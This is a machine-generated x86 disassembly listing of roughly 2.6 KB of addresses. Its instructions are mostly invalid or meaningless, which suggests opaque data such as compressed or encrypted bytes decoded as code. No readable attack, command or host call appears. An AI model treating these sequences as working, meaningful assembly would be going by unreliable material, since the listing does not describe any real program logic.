  424b61:	push   0xffffffce
  424b63:	mov    DWORD PTR [ecx-0x3d4039ac],esp
  424b69:	aad    0x4d
  424b6b:	or     bh,ch
	...
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	xor    eax,DWORD PTR [eax-0x764beb98]
  424be8:	add    DWORD PTR [eax],eax
  424bea:	inc    DWORD PTR [eax]
  424bec:	add    BYTE PTR [eax],al
  424bee:	lea    edx,[ebx+0x75]
  424bf1:	or     cl,dl
  424bf3:	xor    ebx,eax
  424bf5:	icebp  
  424bf6:	out    0x18,al
  424bf8:	sti    
  424bf9:	sub    DWORD PTR [edi+ebp*2-0x4914183d],esp
  424c00:	stos   DWORD PTR es:[edi],eax
  424c01:	test   ebp,edi
  424c03:	jns    0x424c35
  424c05:	pop    esp
  424c06:	fbstp  TBYTE PTR [ecx+0x4abf7212]
  424c0c:	jl     0x424be2
  424c0e:	push   esp
  424c0f:	out    0x3c,eax
  424c11:	arpl   WORD PTR [eax+0x44],ax
  424c14:	addr16 xchg edx,eax
  424c16:	mov    edx,ecx
  424c18:	xor    al,dl
  424c1a:	adc    al,0x33
  424c1c:	inc    BYTE PTR [edi]
  424c1e:	int3   
  424c1f:	mov    ebp,0xb99b22b
  424c24:	push   edx
  424c25:	lds    edi,FWORD PTR [eax-0x14]
  424c28:	mov    al,0x43
  424c2a:	mov    esi,0x40c43497
  424c2f:	jne    0x424c5f
  424c31:	and    eax,0x2854ad25
  424c36:	pop    ebx
  424c37:	inc    ecx
  424c38:	gs cmp al,0xdf
  424c3b:	push   ss
  424c3c:	dec    esp
  424c3d:	xor    eax,0x1d744dd4
  424c42:	cmp    DWORD PTR [esi],edx
  424c44:	loopne 0x424c1b
  424c46:	or     BYTE PTR [esi],al
  424c48:	fcomi  st,st(1)
  424c4a:	pop    ebx
  424c4b:	scas   eax,DWORD PTR es:[edi]
  424c4c:	inc    esi
  424c4d:	or     DWORD PTR [ebp+0x47],edi
  424c50:	cs jmp 0x5d545ac0
  424c56:	xchg   ecx,eax
  424c57:	cmp    DWORD PTR [ebx],edi
  424c59:	push   cs
  424c5a:	cmp    esi,eax
  424c5c:	fs addr16 dec ebp
  424c5f:	in     al,dx
  424c60:	jnp    0x424c04
  424c62:	adc    eax,0x71c6dc40
  424c67:	mul    DWORD PTR [edi]
  424c69:	rol    BYTE PTR [edx-0x6],1
  424c6c:	fdiv   DWORD PTR [edi-0x72bc8a7e]
  424c72:	jecxz  0x424cb7
  424c74:	(bad)  
  424c75:	cld    
  424c76:	mov    dh,0x9
  424c78:	ins    DWORD PTR es:[edi],dx
  424c79:	arpl   bx,dx
  424c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c7c:	ja     0x424c5a
  424c7e:	ret    
  424c7f:	in     eax,0x24
  424c81:	(bad)  
  424c83:	inc    ebx
  424c84:	xchg   ebx,eax
  424c85:	xor    ecx,ebp
  424c87:	(bad)  
  424c88:	hlt    
  424c89:	rcl    BYTE PTR [ebp+0x1fae3c10],cl
  424c8f:	sub    al,0x8
  424c91:	in     al,0xcd
  424c93:	sbb    BYTE PTR [ebx+0xb2818e3],ah
  424c99:	and    eax,0xda33752b
  424c9e:	jbe    0x424cd3
  424ca0:	cwde   
  424ca1:	fstp   TBYTE PTR [esi-0x65]
  424ca4:	out    0xa,al
  424ca6:	repz add dh,0xcc
  424caa:	push   esi
  424cab:	clc    
  424cac:	dec    ebp
  424cad:	mov    ds:0xaf967bda,al
  424cb2:	outs   dx,BYTE PTR ds:[esi]
  424cb3:	out    dx,al
  424cb4:	push   es
  424cb5:	lods   eax,DWORD PTR ds:[esi]
  424cb6:	pop    edx
  424cb7:	jae    0x424c53
  424cb9:	(bad)  
  424cba:	inc    ah
  424cbc:	cwde   
  424cbd:	data16 add al,BYTE PTR [edx+edi*8+0x41]
  424cc2:	loop   0x424ccc
  424cc4:	mov    ds:0xeab17c13,al
  424cc9:	mov    si,0x904c
  424ccd:	ds jle 0x424ce3
  424cd0:	inc    esp
  424cd1:	pushf  
  424cd2:	(bad)
  424cd5:	dec    esp
  424cd6:	jae    0x424d3c
  424cd8:	mov    bh,0xc8
  424cda:	cwde   
  424cdb:	imul   ebp,DWORD PTR ds:0x3727e1ee,0x8c064b74
  424ce5:	push   0xfb4b108b
  424cea:	inc    esi
  424ceb:	hlt    
  424cec:	arpl   WORD PTR [eax],ax
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x608751a8]
  424d64:	jmp    0x1cd0109
  424d69:	add    bh,bh
  424d6b:	add    BYTE PTR [eax],al
  424d6d:	add    BYTE PTR [esi+0x2e9ee3dc],bl
  424d73:	pusha  
  424d74:	or     bl,BYTE PTR [esi]
  424d76:	cmp    BYTE PTR [ecx-0x6d88f3ef],dh
  424d7c:	lods   al,BYTE PTR ds:[esi]
  424d7d:	push   eax
  424d7e:	sar    BYTE PTR [ebx],cl
  424d80:	sub    al,0x1f
  424d82:	lea    esi,ss:[edi+0x5a]
  424d86:	retf   
  424d87:	in     eax,dx
  424d88:	cdq    
  424d89:	lock pusha 
  424d8b:	out    dx,al
  424d8c:	lods   al,BYTE PTR ds:[esi]
  424d8d:	loopne 0x424de4
  424d8f:	out    dx,al
  424d90:	dec    edx
  424d91:	dec    edi
  424d92:	add    al,0x95
  424d94:	rcl    BYTE PTR [eax+0x37c560cf],0x1
  424d9b:	push   ss
  424d9c:	or     dl,cl
  424d9e:	shl    DWORD PTR [edx+ebp*2],cl
  424da1:	jno    0x424d2a
  424da3:	lods   al,BYTE PTR ds:[esi]
  424da4:	jns    0x424d2d
  424da6:	loopne 0x424ded
  424da8:	fidiv  DWORD PTR [eax-0x3d]
  424dab:	imul   DWORD PTR [ebx-0x2f02d4bd]
  424db1:	or     al,0xd4
  424db3:	leave  
  424db4:	push   es
  424db5:	add    al,0x40
  424db7:	fnsave [edx+0x21]
  424dba:	push   0x2a
  424dbc:	dec    ebx
  424dbd:	daa    
  424dbe:	rcl    ch,cl
  424dc0:	pop    ebx
  424dc1:	jle    0x424daa
  424dc3:	lahf   
  424dc4:	pop    ecx
  424dc5:	cwde   
  424dc6:	adc    ebp,DWORD PTR [edx+esi*4-0x48]
  424dca:	sbb    esp,eax
  424dcc:	pop    ds
  424dcd:	jns    0x424df7
  424dcf:	int3   
  424dd0:	js     0x424e4b
  424dd2:	or     bl,BYTE PTR [ebp+0x502e4230]
  424dd8:	lock mov ebp,0x1f371283
  424dde:	sub    edi,esp
  424de0:	jl     0x424e3d
  424de2:	pop    es
  424de3:	xor    bh,dh
  424de5:	adc    eax,0x110ea001
  424dea:	lods   eax,DWORD PTR ds:[esi]
  424deb:	sub    bh,BYTE PTR [edi+0x6a]
  424dee:	dec    edi
  424def:	call   DWORD PTR [esi+edi*1]
  424df2:	das    
  424df3:	pushf  
  424df4:	pop    ebx
  424df5:	popf   
  424df6:	out    dx,al
  424df7:	loope  0x424e3b
  424df9:	fs loop 0x424dbb
  424dfc:	dec    edx
  424dfd:	cmp    eax,0xe6bfcdbd
  424e02:	sbb    al,0xef
  424e04:	push   ss
  424e05:	xchg   ebx,eax
  424e06:	inc    BYTE PTR [ebx-0x42]
  424e09:	mov    dl,0x43
  424e0b:	mov    eax,0xea5a4800
  424e10:	or     dh,BYTE PTR [edx+0x5a]
  424e13:	(bad)  
  424e14:	jns    0x424db3
  424e16:	inc    DWORD PTR [edi]
  424e18:	cli    
  424e19:	pop    ds
  424e1a:	cmp    DWORD PTR [edi-0x3d91edf5],eax
  424e20:	arpl   WORD PTR [ebx+0x7d],sp
  424e23:	add    ecx,DWORD PTR [eax-0x7a9120bc]
  424e29:	out    0x3,eax
  424e2b:	cmp    al,0x18
  424e2d:	fimul  WORD PTR [edx-0x64d59bbe]
  424e33:	js     0x424ddf
  424e35:	adc    BYTE PTR [ebx],bh
  424e37:	repz xchg ebp,eax
  424e39:	xchg   esi,eax
  424e3a:	out    0x16,al
  424e3c:	out    0x59,eax
  424e3e:	xlat   BYTE PTR ds:[ebx]
  424e3f:	xchg   esp,eax
  424e40:	push   esp
  424e41:	jp     0x424dd0
  424e43:	sbb    al,0x3b
  424e45:	mov    bl,0xaf
  424e47:	mov    ch,0x36
  424e49:	or     al,0x13
  424e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e4c:	xlat   BYTE PTR ds:[ebx]
  424e4d:	or     eax,0xfe559186
  424e52:	js     0x424dee
  424e54:	lock sub DWORD PTR [eax+0x57223492],edx
  424e5b:	and    bh,BYTE PTR [ecx+0xd8a653c]
  424e61:	fild   DWORD PTR [eax]
  424e63:	add    bh,ah
  424e65:	popf   
  424e66:	mov    eax,esi
  424e68:	mov    esi,0x30ef8bc5
	...
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424ed6
  424ee3:	(bad)  
  424ee4:	sbb    al,BYTE PTR [edx]
  424ee6:	mov    dl,0x8b
  424ee8:	add    DWORD PTR [eax],eax
  424eea:	inc    DWORD PTR [eax]
  424eec:	add    BYTE PTR [eax],al
  424eee:	stc    
  424eef:	sub    al,0x5b
  424ef1:	xlat   BYTE PTR ds:[ebx]
  424ef2:	aam    0xbf
  424ef4:	out    dx,al
  424ef5:	push   edx
  424ef6:	xchg   DWORD PTR [ebx],esi
  424ef8:	stos   DWORD PTR es:[edi],eax
  424ef9:	add    eax,0xf57e7631
  424efe:	das    
  424eff:	aam    0xd0
  424f01:	out    dx,al
  424f02:	push   edi
  424f03:	(bad)  
  424f04:	loopne 0x424f1a
  424f06:	(bad)  
  424f07:	and    eax,0x5a48f451
  424f0c:	cmc    
  424f0d:	(bad)  
  424f0e:	lock xchg ebx,eax
  424f10:	jl     0x424f66
  424f12:	not    bh
  424f14:	fcom   DWORD PTR [esi-0x10626354]
  424f1a:	ds aaa 
  424f1c:	dec    ebp
  424f1d:	xchg   esi,eax
  424f1e:	lahf   
  424f1f:	xor    BYTE PTR [eax],0xf2
  424f22:	push   ss
  424f23:	sbb    esp,ebp
  424f25:	es xchg esi,eax
  424f27:	and    DWORD PTR [eax+0x5532eab6],esi
  424f2d:	cmc    
  424f2e:	mov    BYTE PTR [edi+0x5bb7775d],ah
  424f34:	es push esp
  424f36:	push   eax
  424f37:	sbb    BYTE PTR [edi],dl
  424f39:	repz mov cl,0x86
  424f3c:	xchg   DWORD PTR [edx+edx*8],esi
  424f3f:	sub    DWORD PTR [edx-0x3ef71302],ecx
  424f45:	jmp    esi
  424f47:	dec    edi
  424f48:	add    al,0x3f
  424f4a:	dec    ebp
  424f4b:	pop    ebp
  424f4c:	loope  0x424f67
  424f4e:	fisttp QWORD PTR [ebx+0x59951b3d]
  424f54:	fst    DWORD PTR [ecx]
  424f56:	pop    es
  424f57:	sbb    DWORD PTR [eax-0x76e7a4a6],0xffffffae
  424f5e:	pop    eax
  424f5f:	or     al,ah
  424f61:	nop
  424f62:	mov    edi,0x8486daa0
  424f67:	iret   
  424f68:	xor    ebx,esi
  424f6a:	fucom  st(6)
  424f6c:	movups xmm3,XMMWORD PTR [eax+0x12]
  424f70:	fisubr WORD PTR [ecx-0x79]
  424f73:	adc    DWORD PTR [ebx],esp
  424f75:	aaa    
  424f76:	cwde   
  424f77:	aaa    
  424f78:	pop    eax
  424f79:	fsubr  DWORD PTR [ecx]
  424f7b:	mov    bh,0x8b
  424f7d:	rcr    BYTE PTR [edi],0xa9
  424f80:	in     eax,0x81
  424f82:	xchg   ebx,eax
  424f83:	rdtsc  
  424f85:	push   edx
  424f86:	inc    esi
  424f87:	loope  0x424ffa
  424f89:	popf   
  424f8a:	lea    eax,[esi+0x47730fa2]
  424f90:	or     dl,dl
  424f92:	pop    ds
  424f93:	cmp    dh,BYTE PTR [ebp-0x378ae51c]
  424f99:	(bad)  
  424f9b:	sbb    bh,0x66
  424f9e:	xor    cl,bl
  424fa0:	jmp    0x2115:0x67c8273b
  424fa7:	xor    esp,0xfd4eb5f2
  424fad:	mov    ?,esp
  424faf:	dec    ebx
  424fb0:	in     eax,dx
  424fb1:	adc    bh,BYTE PTR ds:0x3732a52b
  424fb7:	dec    ebx
  424fb8:	inc    edx
  424fb9:	push   eax
  424fba:	inc    ebp
  424fbb:	imul   edi,DWORD PTR [edx+0x76],0x735df63f
  424fc2:	sub    DWORD PTR [ebp-0x3c],eax
  424fc5:	jo     0x424f6f
  424fc7:	ret    
  424fc8:	inc    esp
  424fc9:	sub    eax,0x68ca04a5
  424fce:	dec    edx
  424fcf:	inc    eax
  424fd0:	mov    edi,0xfb5ebbd
  424fd5:	adc    eax,0x3b545dfc
  424fda:	sub    eax,esi
  424fdc:	in     al,0x35
  424fde:	in     eax,dx
  424fdf:	retf   
  424fe0:	mov    bl,0x7d
  424fe2:	push   eax
  424fe3:	inc    edx
  424fe4:	cld    
  424fe5:	cli    
  424fe6:	sbb    cl,ch
  424fe8:	inc    esp
  424fe9:	stos   BYTE PTR es:[edi],al
  424fea:	rcr    BYTE PTR [edi-0x49],1
	...
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	fincstp 
  425064:	cs test eax,0x18cb1
  42506a:	inc    DWORD PTR [eax]
  42506c:	add    BYTE PTR [eax],al
  42506e:	or     eax,0x10a12e0
  425073:	aaa    
  425074:	sub    DWORD PTR [ebx-0x50b5024f],ecx
  42507a:	xchg   edi,eax
  42507b:	outs   dx,DWORD PTR ds:[esi]
  42507c:	jmp    0xe07e:0x3cd93140
  425083:	push   ss
  425084:	(bad)  
  425085:	lods   al,BYTE PTR ds:[esi]
  425086:	ud2    
  425088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425089:	aad    0x8f
  42508b:	jnp    0x425013
  42508d:	xor    BYTE PTR [ecx+0x1c],al
  425090:	or     BYTE PTR [ebx],cl
  425092:	out    0x8c,al
  425094:	adc    eax,0x35a6c5bd
  425099:	lea    ebx,[edx+0x6f]
  42509c:	ins    BYTE PTR es:[edi],dx
  42509d:	js     0x42511a
  42509f:	jae    0x425098
  4250a1:	cmp    dh,BYTE PTR [edx+0x16]
  4250a4:	dec    dx
  4250a6:	rcr    DWORD PTR [eiz*1-0x6ab3be63],0x3f
  4250ae:	inc    esp
  4250af:	push   ecx
  4250b0:	xor    BYTE PTR ds:0x802c6b2a,ah
  4250b6:	xor    DWORD PTR [esp+eax*8],edx
  4250b9:	mov    WORD PTR [edi],ss
  4250bb:	sbb    dh,BYTE PTR [esi]
  4250bd:	sbb    al,0x51
  4250bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250c0:	outs   dx,DWORD PTR ds:[esi]
  4250c1:	cmp    esi,ebx
  4250c3:	mov    al,ds:0x39a10ba7
  4250c8:	pop    ss
  4250c9:	or     BYTE PTR [ebp-0x3c],cl
  4250cc:	stos   BYTE PTR es:[edi],al
  4250cd:	pop    edi
  4250ce:	jne    0x4250dd
  4250d0:	xchg   eax,edi
  4250d2:	shr    edx,1
  4250d4:	xchg   esp,eax
  4250d5:	test   al,0x46
  4250d7:	sar    DWORD PTR [eax],cl
  4250d9:	outs   dx,BYTE PTR ds:[esi]
  4250da:	dec    ebx
  4250db:	cs test al,0x4f
  4250de:	sub    al,0x7e
  4250e0:	push   edx
  4250e1:	sub    eax,0xd0db57a6
  4250e6:	lods   eax,DWORD PTR ds:[esi]
  4250e7:	fistp  DWORD PTR [esi-0x2278f3a9]
  4250ed:	int3   
  4250ee:	loopne 0x425089
  4250f0:	in     al,dx
  4250f1:	fucomp st(6)
  4250f3:	xor    al,BYTE PTR [edx+edx*2+0x28a9ff17]
  4250fa:	dec    ebx
  4250fb:	lods   eax,DWORD PTR ds:[esi]
  4250fc:	jecxz  0x425171
  4250fe:	sbb    eax,DWORD PTR [ecx+0x41cbd23]
  425104:	push   0x3d401bb7
  425109:	pushf  
  42510a:	aas    
  42510b:	imul   ecx,DWORD PTR [edx],0xa2de5ccc
  425111:	jns    0x4250a1
  425113:	rcr    DWORD PTR ds:0xee290ee4,1
  425119:	xor    DWORD PTR [ebx],edx
  42511b:	and    dl,BYTE PTR [eax]
  42511d:	mov    eax,ds:0xbc332595
  425122:	stos   DWORD PTR es:[edi],eax
  425123:	jo     0x425114
  425125:	mov    WORD PTR [ebx-0x6c],es
  425128:	inc    esp
  425129:	sbb    edx,DWORD PTR [esi-0x2a]
  42512c:	dec    ebp
  42512d:	push   ebx
  42512e:	dec    ecx
  42512f:	add    al,BYTE PTR [esi+0x53be8d9f]
  425135:	inc    ebp
  425136:	and    al,0x23
  425138:	stos   BYTE PTR es:[edi],al
  425139:	and    eax,0xc1927f81
  42513e:	jecxz  0x4250d1
  425140:	xor    DWORD PTR [ebx],esi
  425142:	dec    ebp
  425143:	out    0x43,al
  425145:	pop    edx
  425146:	lds    edx,FWORD PTR [esi+0x13]
  425149:	mov    ds:0x813b3be0,eax
  42514e:	xor    eax,0x5fcdcade
  425153:	add    bl,dh
  425155:	mov    dh,cl
  425157:	shl    BYTE PTR [esi],0x2e
  42515a:	dec    ecx
  42515b:	xchg   esp,eax
  42515c:	popa   
  42515d:	jle    0x4250eb
  42515f:	outs   dx,BYTE PTR ds:[esi]
  425160:	jno    0x4251be
  425162:	mov    WORD PTR [ecx+0x70],es
  425165:	push   edx
  425166:	ds out dx,eax
  425168:	lock stos BYTE PTR es:[edi],al
  42516a:	xchg   DWORD PTR [ecx],eax
  42516c:	mov    dh,0x0
	...
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x1be6:0xc71c92e8
  4251e6:	mov    al,0x8d
  4251e8:	add    DWORD PTR [eax],eax
  4251ea:	inc    DWORD PTR [eax]
  4251ec:	add    BYTE PTR [eax],al
  4251ee:	mov    ?,WORD PTR [edi+0x62c9f864]
  4251f4:	mov    ds:0x84606f4a,eax
  4251f9:	pop    ecx
  4251fa:	inc    eax
  4251fb:	pop    edx
  4251fc:	imul   ebx,DWORD PTR [edx+0x1581289f],0x91cdabf9
  425206:	sub    ebx,ebp
  425208:	sub    edx,edx
  42520a:	xchg   esp,eax
  42520b:	(bad)  
  42520c:	arpl   WORD PTR [ecx],bp
  42520e:	add    eax,0xcae35ae8
  425213:	into   
  425214:	loop   0x42521d
  425216:	pop    ss
  425217:	adc    bl,BYTE PTR [ebp-0x682a59c9]
  42521d:	adc    ebp,DWORD PTR [ecx+0x74203077]
  425223:	xor    edx,esp
  425225:	aam    0xdb
  425227:	xor    cl,BYTE PTR [ebx+0x22]
  42522a:	xor    DWORD PTR [ebp+0x173538a0],ecx
  425230:	aaa    
  425231:	(bad)  
  425232:	mov    esi,0x6b46af75
  425237:	sbb    BYTE PTR [eax],bh
  425239:	daa    
  42523a:	aam    0xcc
  42523c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42523d:	(bad)
  425242:	(bad)  
  425243:	adc    eax,0x3fdf5a0c
  425248:	cdq    
  425249:	push   0x87f9eff2
  42524e:	imul   DWORD PTR [esi-0x60c941d7]
  425254:	and    BYTE PTR [ebx-0x2b],cl
  425257:	loopne 0x4252c2
  425259:	pushf  
  42525a:	cmp    esp,DWORD PTR [eax]
  42525c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42525d:	pop    eax
  42525e:	popf   
  42525f:	push   eax
  425260:	aad    0x64
  425262:	cmp    eax,ebp
  425264:	dec    edx
  425265:	pop    es
  425266:	scas   al,BYTE PTR es:[edi]
  425267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425268:	ret    0x50ff
  42526b:	sub    al,0x3b
  42526d:	stc    
  42526e:	inc    ebx
  42526f:	lock xor DWORD PTR [edx+0x3dc897cd],0x6c
  425277:	cmp    BYTE PTR [eax+0x3f2b7e4c],0x78
  42527e:	ins    BYTE PTR es:[edi],dx
  42527f:	fwait
  425280:	bound  esp,QWORD PTR [edi+0x1505923a]
  425286:	pop    edi
  425287:	dec    ebp
  425288:	jmp    ebp
  42528a:	das    
  42528b:	out    0x9,eax
  42528d:	jne    0x4252fd
  42528f:	call   0x327d:0xcc7227cf
  425296:	dec    eax
  425297:	xlat   BYTE PTR ds:[ebx]
  425298:	and    DWORD PTR [edx],esp
  42529a:	repz cmp cl,0x22
  42529e:	mov    bl,0x7c
  4252a0:	add    esi,DWORD PTR [eax-0x2]
  4252a3:	adc    edi,DWORD PTR [esi]
  4252a5:	mov    esi,0xf95faa7
  4252aa:	jae    0x425300
  4252ac:	ret    
  4252ad:	daa    
  4252ae:	or     eax,0xac67ef50
  4252b3:	jle    0x42528e
  4252b5:	hlt    
  4252b6:	loope  0x425275
  4252b8:	mov    ds:0xff769c4,al
  4252be:	xor    edx,ecx
  4252c0:	pop    es
  4252c1:	imul   ecx,DWORD PTR [edx],0x3c
  4252c4:	outs   dx,DWORD PTR ds:[esi]
  4252c5:	cmp    BYTE PTR [edx+0x7c],0x67
  4252c9:	jp     0x4252de
  4252cb:	and    eax,0xf5d7edc1
  4252d0:	push   ecx
  4252d1:	pop    ebp
  4252d2:	(bad)  
  4252d4:	jae    0x425323
  4252d6:	stos   DWORD PTR es:[edi],eax
  4252d7:	jne    0x425355
  4252d9:	pop    ss
  4252da:	jecxz  0x4252be
  4252dc:	mov    ?,WORD PTR [ecx]
  4252de:	mov    ebx,0x2d542b29
  4252e3:	pusha  
  4252e4:	shr    DWORD PTR [esp+edx*8],cl
  4252e7:	push   es
  4252e8:	(bad)  
  4252e9:	int    0x29
  4252eb:	inc    esi
  4252ec:	les    eax,FWORD PTR [eax]
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	pop    edx
  425363:	test   BYTE PTR [ebx+0x18eaf21],cl
  425369:	add    bh,bh
  42536b:	add    BYTE PTR [eax],al
  42536d:	add    ch,bl
  42536f:	rol    BYTE PTR [ebx+0x1f],cl
  425372:	imul   esp,DWORD PTR [edx+0x25f361c2],0xf8e7f9e5
  42537c:	shl    BYTE PTR [ecx-0x1a],cl
  42537f:	pop    es
  425380:	aad    0xf5
  425382:	fs pushf 
  425384:	jnp    0x4253f6
  425386:	jecxz  0x4253d3
  425388:	xchg   BYTE PTR [edx-0x3187aac3],bl
  42538e:	test   BYTE PTR [ebx-0x6c],bh
  425391:	cld    
  425392:	dec    ecx
  425393:	mov    ch,0xee
  425395:	aaa    
  425396:	lahf   
  425397:	inc    ebp
  425398:	pop    es
  425399:	sub    ebp,edi
  42539b:	mov    esp,0x5672f82b
  4253a0:	stc    
  4253a1:	push   esi
  4253a2:	loop   0x42535c
  4253a4:	pop    ebx
  4253a5:	loopne 0x425348
  4253a7:	mov    ecx,0x7e295128
  4253ac:	push   0xe
  4253ae:	cdq    
  4253af:	mov    esp,0xb44b925c
  4253b4:	adc    al,BYTE PTR [esi+0x20]
  4253b7:	mov    bl,0x80
  4253b9:	fcmovu st,st(4)
  4253bb:	xlat   BYTE PTR es:[ebx]
  4253bd:	mov    ss,esp
  4253bf:	into   
  4253c0:	das    
  4253c1:	jmp    0x4253ce
  4253c3:	bnd jge 0x42543c
  4253c6:	mov    ah,0x15
  4253c8:	ss jb  0x425360
  4253cb:	or     BYTE PTR [edx-0x12baf5bb],al
  4253d1:	fisub  WORD PTR [edi]
  4253d3:	and    edi,ebx
  4253d5:	sub    bh,bl
  4253d7:	cld    
  4253d8:	arpl   WORD PTR cs:[edx],sp
  4253db:	int3   
  4253dc:	xchg   DWORD PTR [ecx+0x3c04fe1f],ecx
  4253e2:	loope  0x4253ae
  4253e4:	in     al,0x4f
  4253e6:	add    al,0x1a
  4253e8:	cmp    al,0x76
  4253ea:	mov    cl,0x2e
  4253ed:	push   esp
  4253ee:	xchg   ecx,eax
  4253ef:	adc    DWORD PTR [ecx+edx*2],ebp
  4253f2:	pop    ebp
  4253f3:	shl    BYTE PTR [eax-0x3f],cl
  4253f6:	cmp    al,0x9c
  4253f8:	dec    esi
  4253f9:	and    al,0x8c
  4253fb:	jmp    0xdeedab13
  425400:	xchg   ecx,eax
  425401:	repz jno 0x425436
  425404:	or     bh,ch
  425406:	ret    0x34cc
  425409:	int    0x1e
  42540b:	jnp    0x4253e5
  42540d:	xchg   ecx,eax
  42540e:	jne    0x42546e
  425410:	mov    eax,ds:0x5c4b2499
  425415:	or     al,0xdb
  425417:	pop    edx
  425418:	and    dh,bh
  42541a:	stos   BYTE PTR es:[edi],al
  42541b:	push   eax
  42541c:	push   ecx
  42541d:	xor    BYTE PTR [ebp+0x44],bh
  425420:	(bad)  [esp+edx*1]
  425423:	sub    eax,0x88ff948c
  425428:	sbb    ebx,ebx
  42542a:	jbe    0x42540a
  42542c:	sbb    edi,edi
  42542e:	jo     0x42547a
  425430:	lods   al,BYTE PTR ds:[esi]
  425431:	sbb    al,0x72
  425433:	cmp    al,0xbf
  425435:	push   ebx
  425437:	mov    al,ds:0xc57ce4e6
  42543c:	mov    bl,0xc8
  42543e:	jle    0x4253e7
  425440:	js     0x4253f5
  425442:	ins    DWORD PTR es:[edi],dx
  425443:	retf   0x97b6
  425446:	mov    ebp,0xbf65315b
  42544b:	popf   
  42544c:	aaa    
  42544d:	in     al,dx
  42544e:	cmp    ebx,ebx
  425450:	das    
  425451:	out    dx,eax
  425452:	(bad)  
  425453:	in     al,0x68
  425455:	xchg   DWORD PTR [edi+0x52],ecx
  425458:	imul   esi,DWORD PTR [ebx+0x64e3cd9c],0xffffff99
  42545f:	fisub  DWORD PTR [ecx+0x5c]
  425462:	jg     0x42543d
  425464:	(bad)  
  425465:	das    
  425466:	mov    esi,0xe8a61416
  42546b:	stos   DWORD PTR es:[edi],eax
  42546c:	push   es
	...
  4254d5:	add    BYTE PTR [edx+0x9],al
  4254d8:	les    ebp,FWORD PTR [ecx-0x14901231]
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edx,DWORD PTR [ecx+0x65]
  4254e4:	sub    ah,BYTE PTR [edi]
  4254e6:	scas   al,BYTE PTR es:[edi]
  4254e7:	pop    DWORD PTR [ecx]
  4254e9:	add    bh,bh
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	add    ah,dl
  4254ef:	jp     0x4254fd
  4254f1:	sub    eax,0x218eb0e7
  4254f6:	sbb    edx,DWORD PTR [ebx]
  4254f8:	inc    edi
  4254f9:	fcmovnu st,st(5)
  4254fb:	out    0x87,eax
  4254fd:	mov    dl,0xb0
  4254ff:	jae    0x425492
  425501:	adc    bl,cl
  425503:	fst    QWORD PTR [edi-0x7471d164]
  425509:	dec    ebp
  42550a:	ins    BYTE PTR es:[edi],dx
  42550b:	(bad)
  42550e:	out    0xbf,eax
  425510:	daa    
  425511:	and    eax,0x6978766
  425516:	stos   DWORD PTR es:[edi],eax
  425517:	mov    ebp,0xc0a4784a
  42551c:	push   ds
  42551d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42551e:	sub    BYTE PTR [edi+ecx*2+0x5f],dl
  425522:	jg     0x4254f7
  425524:	inc    edi
  425525:	aas    
  425526:	rcr    BYTE PTR [edx-0x77],1
  425529:	lock mov DWORD PTR [eax],ebx
  42552c:	adc    cl,cl
  42552e:	mov    esi,ebp
  425530:	inc    ecx
  425531:	stos   DWORD PTR es:[edi],eax
  425532:	jne    0x4254cc
  425534:	inc    edi
  425535:	jb     0x425559
  425537:	aam    0x78
  425539:	into   
  42553a:	cld    
  42553b:	xor    al,0xb6
  42553d:	aas    
  42553e:	(bad)  
  42553f:	inc    esi
  425540:	mov    dl,0x3c
  425542:	rcr    dh,0xf1
  425545:	(bad)  
  425546:	int3   
  425547:	jnp    0x4254ea
  425549:	invlpg BYTE PTR [edx-0x46eb8434]
  425550:	cwde   
  425551:	inc    ebx
  425552:	xchg   ebx,eax
  425553:	dec    esp
  425554:	ins    BYTE PTR es:[edi],dx
  425555:	ins    DWORD PTR es:[edi],dx
  425556:	lods   eax,DWORD PTR ss:[esi]
  425558:	pop    esi
  425559:	lods   al,BYTE PTR ds:[esi]
  42555a:	mov    ch,0x3e
  42555c:	sbb    al,BYTE PTR ds:0x91e8275e
  425562:	jge    0x42558a
  425564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425565:	daa    
  425566:	gs and eax,0xc3668fb3
  42556c:	pop    ebp
  42556d:	sbb    DWORD PTR [esi],esi
  42556f:	pop    ss
  425570:	call   0x49a1:0x395a0671
  425577:	int3   
  425578:	add    DWORD PTR [edx-0x11b33129],ecx
  42557e:	jecxz  0x4255a8
  425580:	pop    esp
  425581:	mov    ebx,0xdf4a6ab5
  425586:	div    BYTE PTR [ebp+0x2f]
  425589:	mov    ebp,0x6870462
  42558e:	xchg   edi,eax
  42558f:	sbb    eax,ebx
  425591:	adc    al,0x85
  425593:	stc    
  425594:	mov    eax,ds:0xd3312eae
  425599:	je     0x4255fa
  42559b:	xchg   ebp,eax
  42559c:	sub    al,0x6f
  42559e:	xor    al,BYTE PTR [edx]
  4255a0:	(bad)  [eax+0x76]
  4255a3:	mov    eax,ds:0xdb36ccbd
  4255a8:	pop    ebx
